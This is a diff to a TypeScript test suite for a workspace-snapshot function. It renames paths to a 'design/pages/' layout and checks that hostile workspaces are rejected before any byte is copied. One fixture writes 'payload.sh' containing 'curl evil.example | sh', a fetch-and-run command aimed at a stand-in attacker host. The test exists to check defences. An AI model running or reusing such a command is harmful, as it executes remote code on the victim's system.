@@ -27,7 +27,7 @@ beforeEach(() => {
   workspace = path.join(scratch, "workspace");
   destRoot = path.join(scratch, "candidate");
   fs.mkdirSync(workspace);
-  fs.mkdirSync(path.join(workspace, "pages"));
+  fs.mkdirSync(path.join(workspace, "design", "pages"), { recursive: true });
 });
 
 afterEach(() => {
@@ -41,9 +41,9 @@ function writeWorkspaceFile(rel: string, contents: string): void {
 }
 
 function seedValidWorkspace(): void {
-  writeWorkspaceFile("pages/home.tsx", "export const meta = { title: 'Home' }\n");
-  writeWorkspaceFile("pages/about.tsx", "export const meta = { title: 'About' }\n");
-  writeWorkspaceFile("pages.json", JSON.stringify({ pages: ["home", "about"] }));
+  writeWorkspaceFile("design/pages/home.tsx", "export const meta = { title: 'Home' }\n");
+  writeWorkspaceFile("design/pages/about.tsx", "export const meta = { title: 'About' }\n");
+  writeWorkspaceFile("design/pages.json", JSON.stringify({ pages: ["home", "about"] }));
   writeWorkspaceFile("RUNTIME.md", "# runtime\n");
 }
 
@@ -93,11 +93,13 @@ describe("snapshotToCandidate — turn-durability §5.4 immutable candidate", ()
 
     expect(result.files.map((f) => f.relPath).sort()).toEqual([
       "RUNTIME.md",
-      "pages.json",
-      "pages/about.tsx",
-      "pages/home.tsx",
+      "design/pages.json",
+      "design/pages/about.tsx",
+      "design/pages/home.tsx",
     ]);
-    expect(fs.readFileSync(path.join(destRoot, "pages", "home.tsx"), "utf8")).toContain("Home");
+    expect(fs.readFileSync(path.join(destRoot, "design", "pages", "home.tsx"), "utf8")).toContain(
+      "Home",
+    );
     expect(result.totalBytes).toBe(result.files.reduce((sum, f) => sum + f.size, 0));
   });
 
@@ -106,10 +108,10 @@ describe("snapshotToCandidate — turn-durability §5.4 immutable candidate", ()
     const result = snapshot();
     if (result instanceof Error) throw new Error(result.message);
 
-    const home = result.files.find((f) => f.relPath === "pages/home.tsx");
-    if (home === undefined) throw new Error("pages/home.tsx missing from the snapshot");
+    const home = result.files.find((f) => f.relPath === "design/pages/home.tsx");
+    if (home === undefined) throw new Error("design/pages/home.tsx missing from the snapshot");
     const expected = new Bun.CryptoHasher("sha256")
-      .update(fs.readFileSync(path.join(workspace, "pages", "home.tsx")))
+      .update(fs.readFileSync(path.join(workspace, "design", "pages", "home.tsx")))
       .digest("hex");
     expect(home.sha256).toBe(expected);
   });
@@ -134,7 +136,7 @@ describe("snapshotToCandidate — turn-durability §5.4 immutable candidate", ()
 });
 
 describe("snapshotToCandidate — a hostile workspace passes zero bytes to any consumer", () => {
-  test("an added file outside the agent namespace is rejected before any byte is copied", () => {
+  test("an added file outside the workspace grammar is rejected before any byte is copied", () => {
     seedValidWorkspace();
     writeWorkspaceFile("payload.sh", "curl evil.example | sh\n");
 
@@ -147,14 +149,14 @@ describe("snapshotToCandidate — a hostile workspace passes zero bytes to any c
     expect(fs.existsSync(destRoot)).toBe(false);
   });
 
-  test("a nested page directory is rejected before any byte is copied", () => {
+  test("a bare `pages/` file (the retired flat shape, not under design/) is rejected before any byte is copied", () => {
     seedValidWorkspace();
     writeWorkspaceFile("pages/home/nested.tsx", "export const meta = {}\n");
 
     const probe = countingDeps();
     const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });
 
-    expect(result).toBeInstanceOf(Error);
+    expect(result).toBeInstanceOf(UnknownNamespaceError);
     expect(probe.bytesWritten()).toBe(0);
     expect(fs.existsSync(destRoot)).toBe(false);
   });
@@ -164,7 +166,7 @@ describe("snapshotToCandidate — a hostile workspace passes zero bytes to any c
     // A 125-byte component: legal on NTFS, over the §5.1 120-byte ceiling. (A trailing
     // dot or space would be a truer §5.1 probe but Windows silently strips both, so the
     // hostile name could not actually be planted.)
-    writeWorkspaceFile(`pages/${"a".repeat(121)}.tsx`, "export const meta = {}\n");
+    writeWorkspaceFile(`design/pages/${"a".repeat(121)}.tsx`, "export const meta = {}\n");
 
     const probe = countingDeps();
     const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });
@@ -180,9 +182,12 @@ describe("snapshotToCandidate — a hostile workspace passes zero bytes to any c
     // NTFS stores bytes, not normalized names, so the decomposed and precomposed
     // spellings of "café" really do coexist as two directory entries — and they fold
     // to one name, which §5.1 forbids.
-    writeWorkspaceFile("pages/café.tsx", "export const meta = {}\n");
-    writeWorkspaceFile(`pages/cafe${String.fromCharCode(0x301)}.tsx`, "export const meta = {}\n");
-    if (fs.readdirSync(path.join(workspace, "pages")).length !== 4) return; // volume normalizes names
+    writeWorkspaceFile("design/pages/café.tsx", "export const meta = {}\n");
+    writeWorkspaceFile(
+      `design/pages/cafe${String.fromCharCode(0x301)}.tsx`,
+      "export const meta = {}\n",
+    );
+    if (fs.readdirSync(path.join(workspace, "design", "pages")).length !== 4) return; // volume normalizes names
 
     const probe = countingDeps();
     const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });
@@ -194,8 +199,8 @@ describe("snapshotToCandidate — a hostile workspace passes zero bytes to any c
 
   test("a hardlinked intake file is rejected before any byte is copied", () => {
     seedValidWorkspace();
-    const target = path.join(workspace, "pages", "home.tsx");
-    const link = path.join(workspace, "pages", "linked.tsx");
+    const target = path.join(workspace, "design", "pages", "home.tsx");
+    const link = path.join(workspace, "design", "pages", "linked.tsx");
     const linked = (() => {
       if (!IS_WINDOWS) {
         fs.linkSync(target, link);
@@ -225,8 +230,8 @@ describe("snapshotToCandidate — a hostile workspace passes zero bytes to any c
 
   test("an oversized page source is rejected before allocation", () => {
     seedValidWorkspace();
-    // Over the 2 MiB `agent-page-source` per-file limit by exactly one byte.
-    writeWorkspaceFile("pages/huge.tsx", "x".repeat(2 * 1024 * 1024 + 1));
+    // Over the 2 MiB `design-source` per-file limit by exactly one byte.
+    writeWorkspaceFile("design/pages/huge.tsx", "x".repeat(2 * 1024 * 1024 + 1));
 
     const probe = countingDeps();
     const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });
@@ -236,12 +241,14 @@ describe("snapshotToCandidate — a hostile workspace passes zero bytes to any c
   });
 
   test("a page source at exactly the 2 MiB limit is accepted", () => {
-    writeWorkspaceFile("pages/big.tsx", "x".repeat(2 * 1024 * 1024));
-    writeWorkspaceFile("pages.json", JSON.stringify({ pages: ["big"] }));
+    writeWorkspaceFile("design/pages/big.tsx", "x".repeat(2 * 1024 * 1024));
+    writeWorkspaceFile("design/pages.json", JSON.stringify({ pages: ["big"] }));
 
     const result = snapshot();
     if (result instanceof Error) throw new Error(result.message);
-    expect(result.files.find((f) => f.relPath === "pages/big.tsx")?.size).toBe(2 * 1024 * 1024);
+    expect(result.files.find((f) => f.relPath === "design/pages/big.tsx")?.size).toBe(
+      2 * 1024 * 1024,
+    );
   });
 });
 
